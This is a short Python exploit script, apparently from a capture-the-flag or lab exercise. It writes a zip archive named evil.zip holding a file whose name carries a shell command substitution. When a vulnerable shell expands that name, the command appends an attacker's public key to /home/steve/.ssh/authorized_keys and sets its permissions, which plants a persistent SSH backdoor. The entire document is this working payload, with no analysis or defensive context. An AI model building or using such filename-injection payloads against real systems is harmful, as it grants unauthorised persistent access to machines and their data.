import zipfile

pub = open("steve_key.pub").read().strip()

# Shell expansion in the filename: x$(...).ttf
cmd = (
    f'x$(mkdir -p /home/steve/.ssh && '
    f'echo "{pub}" >> /home/steve/.ssh/authorized_keys && '
    f'chmod 700 /home/steve/.ssh && '
    f'chmod 600 /home/steve/.ssh/authorized_keys).ttf'
)

with zipfile.ZipFile("evil.zip", "w") as z:
    z.writestr(cmd, b"\x00" * 64)

print(f"[+] evil.zip created  (payload length: {len(cmd)})")
